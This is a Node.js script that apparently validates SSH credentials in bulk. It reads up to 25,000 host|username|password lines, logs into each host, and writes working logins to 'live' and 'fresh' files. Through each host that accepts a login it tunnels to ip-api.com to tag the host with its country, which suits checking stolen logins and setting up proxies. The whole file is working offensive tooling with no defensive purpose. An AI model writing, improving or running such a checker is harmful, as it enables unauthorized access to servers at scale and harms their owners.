'use strict';
console.time('time')
const sshFile = './ssh-0909.txt';
var freshCheck = true;
var freshWithDetails = true;

var count = 0,
    fs = require('fs'),
    Connection = require('ssh2'),
    LineByLineReader = require('line-by-line'),
    ssh = new LineByLineReader(sshFile, {
        skipEmptyLines: true
    });

ssh.on('error', function (err) {
    // 'err' contains error object
    console.log('Error reading ssh: ' + err);
    process.exit(-1)
});

ssh.on('end', function () {
    // All lines are read, file is closed now.
    ssh.pause();
    console.log('Done reading ssh.');
    console.timeEnd('time')
    // process.exit()
});

// START

ssh.on('line', function (sline) {
    ssh.pause();
    count++
    console.log(count)

    var stringp = sline.split('|').map(function (item) {
        return item.trim();
    });

    new Promise((resolve, reject) => {
        if (stringp[0] != null && stringp[1] != null && stringp[2] != null) {
            var conn = new Connection();
            conn.on('ready', function () {
                // console.log('Client authenticated!');
                // console.log('Client :: ready');
                if (freshCheck) {

                    conn.forwardOut('127.0.0.1', 8000, 'ip-api.com', 80, function (err, stream) {
                        if (!err) {
                            stream.on('close', function () {
                                // console.log('TCP :: CLOSED');
                                conn.end();
                            }).on('data', function (data) {
                                // console.log('TCP :: DATA: \r\n', data);
                                if (!data) reject();
                                if (freshWithDetails) {
                                    var result = "";
                                    try {
                                        result = JSON.parse(data.toString().match(/\{.*\}/)[0]);
                                        // console.log(result.countryCode, result.country);
                                    } catch (err) {}

                                    fs.appendFileSync('./fresh-.txt', stringp[0] + '|' + stringp[1] + '|' + stringp[2] + '|' + result.countryCode + '|' + result.country + '|' + '\r\n')
                                } else {
                                    fs.appendFileSync('./fresh-.txt', stringp[0] + '|' + stringp[1] + '|' + stringp[2] + '|' + '\r\n')
                                }
                            }).end([
                                (freshWithDetails ? "GET" : "HEAD") + " /json HTTP/1.1",
                                'User-Agent: curl/7.27.0',
                                'Host: 127.0.0.1',
                                'Accept: */*',
                                'Connection: close',
                                '',
                                ''
                            ].join('\r\n'));
                        }
                    });
                } else {
                    fs.appendFileSync('./live-.txt', stringp[0] + '|' + stringp[1] + '|' + stringp[2] + '|' + '\r\n')
                }
            }).on('error', function (err) {
                //console.log('Failed to connect SSH', err);
            }).on('keyboard-interactive', () => {
                console.log("keyboard-interactive")
                fs.appendFileSync('./keyboard-.txt', stringp[0] + '|' + stringp[1] + '|' + stringp[2] + '|' + '\r\n')
            }).connect({
                host: stringp[0],
                port: 22,
                username: stringp[1],
                password: stringp[2],
                // tryKeyboard: true
            });

            resolve();
        }
    }).then(() => {
        if (count <= 25000) {
            ssh.resume();
        } else {
            console.log("Only Accept 25k lines.");
            ssh.end();
        }
    }).catch((err) => {
        console.log("e:", err)
    })
});
